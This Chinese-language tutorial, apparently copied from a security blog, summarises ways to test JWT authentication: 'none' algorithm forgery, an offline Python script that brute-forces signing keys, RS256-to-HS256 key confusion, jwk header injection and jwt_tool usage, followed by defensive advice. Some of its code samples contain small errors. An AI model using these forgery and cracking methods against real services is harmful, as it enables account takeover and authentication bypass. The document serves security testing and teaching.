# 对jwt的安全测试方式总结

[toc]

## jwt简介

相对于传统的session-cookie身份验证机制，Token Auth正在变得流行，也就是说把token信息全部存在客户端。这篇文章就讲讲Token Auth的一种，jwt机制。

> 模拟一下session-cookie机制

jwt(JSON web Token)是一串json格式的字符串，由server端用加密算法对信息签名来保证string的完整性和不可伪造。Token里可以包含所有必要信息，这样server就可以无需保存任何用户或会话的信息，JWT可用于身份认证、绘画状态维持、信息交换等。

> 感觉本质上，是对用户的一些状态信息，进行了加密，这样就很难伪造or修改了。

一个jwt token由三部分组成，`header、payload、signature`，以点隔开，形如`xxx.yyy.zzz`

下面是一个具体的token的例子：

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

- header用来声明token的类型和签名用的算法等，需要经过Base64Url编码。比如以上token的头部经过base64解码后，为`{"alg":"HS256","typ":"JWT"}`

  ```python
  # base64url编码乳腺癌所示
  from base64 import *
  def base64URLen(S):
    t0=b64encode(s)
    t1=t0.strip('=').replace('+','-').replace('/','_')
    return t1
  def base64URLde(s):
      t0=s.replace('-','+').replace('_','/')
      t1=t0+'='*(4-len(t0)%4)%4
      return b64decode(t1)
  ```

- payload用来表示真正的token信息，也需经过base64url编码。比如以上token的payload解码后为`{"sub":"1234567890","name":"John Doe","iat":1516239022fQ}`

- Signature，讲前两部分用alg指定的算法加密，再经过base64url编码，就是signature。

  > [jwt在线解析](https://jwt.io/)

  所以解码jwt token后，内容大致如下

  ![img](https://saucer-man.com/usr/uploads/2019/11/1040192119.png)

## jwt存在的安全风险

### 敏感信息泄漏

我们能轻松解码payload和hedaer，因为这两个都只经过Base64Url编码，而有的时候开发者会误将敏感信息存在payload中。

### 未校验签名

某些服务端并未校验JWT签名，所以，可以尝试修改signature后(或者直接删除signature)看其是否还有效。

### 签名算法可被修改为none(cve-2015-2951)

头部用来声明token的类型和签名用的算法等，比如：

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

以上header指定了签名算法为`HS256`，意味着服务端利用此算法将header和payload进行加密，形成signature，同时接收到token时，也会利用此算法对signature进行签名验证。

> jwt的生成过程是什么样的？

但是如果我们修改了签名算法会怎么样？比如将header修改为：

```
{
"alg": "none",
"typ": "JWT"
}
```

那么服务端收到token后，会认定其是无加密算法， 于是对signature的检验也就失效了，那么我们就可以随意修改payload部分伪造token。

https://jwt.io/#debugger将alg为none视为恶意行为，所以，无法通过在线工具生成JWT，可以用python的jwt库来实现:

![img](https://saucer-man.com/usr/uploads/2019/11/4261358706.png)

用none算法生成的JWT只有两部分了，根本连签名都不存在。

### 签名密钥可被爆破

jwt使用签名算法对hedaer和payload进行加密，如果我们可以爆破出加密密钥，那么也就可以随意修改token了。

这里有一个python版的[jwt爆破脚本](https://github.com/Ch1ngg/JWTPyCrack)

也可以快速用以下脚本爆破:

```python
jwt_str = "xxx.ttt.zzz"
path = "D:/keys.txt"
alg = "HS256"

with open(path,encoding='utf-8') as f:
    for line in f:
        key_ = line.strip()
        try:
            jwt.decode(jwt_str,verify=True,key=key_,algorithm=alg)
            print('found key! --> ' +  key_)
            break
        except(jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError):
            print('found key! --> ' +  key_)
            break
        except(jwt.exceptions.InvalidSignatureError):
            continue
    else:
        print("key not found!")
```

### 修改非对称密码算法为对称密码算法(CVE-2016-10555)

JWT的签名算法有两种类型，对称加密和非对称加密算法。

对称加密算法比如HS256，加解密使用同一个密钥，保存在后端。

非对称加密算法比如RS256，后端加密使用私钥，前端解密使用公钥，公钥是我们可以获取到的。

**如果我们修改header，将算法从RS256更改为HS256，后端代码会使用RS256的公钥作为HS256算法的密钥。于是我们就可以用RS256的公钥伪造数据**

比如说这道CTF题目：https://skysec.top/2018/05/19/2018CUMTCTF-Final-Web/#Pastebin/

### 伪造密钥(CVE-2018-0114)

jwk是header里的一个参数，用于指出密钥，存在被伪造的风险。比如CVE-2018-0114： https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0114

攻击者可以通过以下方法来伪造JWT：删除原始签名，向标头添加新的公钥，然后使用与该公钥关联的私钥进行签名。

比如：

```json
{
  "typ": "JWT",
  "alg": "RS256",
  "jwk": {
    "kty": "RSA",
    "kid": "TEST",
    "use": "sig",
    "e": "AQAB",
    "n": "oUGnPChFQAN1xdA1_f_FWZdFAis64o5hdVyFm4vVFBzTIEdYmZZ3hJHsWi5b_m_tjsgjhCZZnPOLn-ZVYs7pce__rDsRw9gfKGCVzvGYvPY1hkIENNeBfSaQlBhOhaRxA85rBkg8BX7zfMRQJ0fMG3EAZhYbr3LDtygwSXi66CCk4zfFNQfOQEF-Tgv1kgdTFJW-r3AKSQayER8kF3xfMuI7-VkKz-yyLDZgITyW2VWmjsvdQTvQflapS1_k9IeTjzxuKCMvAl8v_TFj2bnU5bDJBEhqisdb2BRHMgzzEBX43jc-IHZGSHY2KA39Tr42DVv7gS--2tyh8JluonjpdQ"
  }
}
```

### Jwt tool

此工具可用于测试jwt的安全性，地址是 https://github.com/ticarpi/jwt_tool

示例用法：

```
λ python jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn 9dm15Po

   $$$$$\ $$\      $$\ $$$$$$$$\  $$$$$$$$\                  $$\
   \__$$ |$$ | $\  $$ |\__$$  __| \__$$  __|                 $$ |
      $$ |$$ |$$$\ $$ |   $$ |       $$ | $$$$$$\   $$$$$$\  $$ |
      $$ |$$ $$ $$\$$ |   $$ |       $$ |$$  __$$\ $$  __$$\ $$ |
$$\   $$ |$$$$  _$$$$ |   $$ |       $$ |$$ /  $$ |$$ /  $$ |$$ |
$$ |  $$ |$$$  / \$$$ |   $$ |       $$ |$$ |  $$ |$$ |  $$ |$$ |
\$$$$$$  |$$  /   \$$ |   $$ |       $$ |\$$$$$$  |\$$$$$$  |$$ |
 \______/ \__/     \__|   \__|$$$$$$\__| \______/  \______/ \__|
  Version 1.3                 \______|


=====================
Decoded Token Values:
=====================

Token header values:
[+] typ = JWT
[+] alg = HS256

Token payload values:
[+] login = ticarpi

----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------


########################################################
#  Options:                                            #
#                ==== TAMPERING ====                   #
#  1: Tamper with JWT data (multiple signing options)  #
#                                                      #
#             ==== VULNERABILITIES ====                #
#  2: Check for the "none" algorithm vulnerability     #
#  3: Check for HS/RSA key confusion vulnerability     #
#  4: Check for JWKS key injection vulnerability       #
#                                                      #
#            ==== CRACKING/GUESSING ====               #
#  5: Check HS signature against a key (password)      #
#  6: Check HS signature against key file              #
#  7: Crack signature with supplied dictionary file    #
#                                                      #
#            ==== RSA KEY FUNCTIONS ====               #
#  8: Verify RSA signature against a Public Key        #
#                                                      #
#  0: Quit                                             #
########################################################

Please make a selection (1-6)
> 1
```

其中的选项分别为：

```
1. 修改JWT
2. 生成None算法的JWT
3. 检查RS/HS256公钥错误匹配漏洞
4. 检测JKU密钥是否可伪造
5. 输入一个key,检查是否正确
6. 输入一个存放key的文本，检查是否正确
7. 输入字典文本，爆破
8. 输入RSA公钥，检查是否正确
```

### 安全建议

一般保证前两点基本就没什么漏洞了。

- 保证密钥的保密性
- 签名算法**固定在后端**，不以JWT里的算法为标准
- 避免敏感信息保存在JWT中
- 尽量JWT的有效时间足够短

## Reference

- copy自[jwt安全测试方法总结](https://saucer-man.com/information_security/377.html)

>其实只是理解了部分，还需要实践一下。
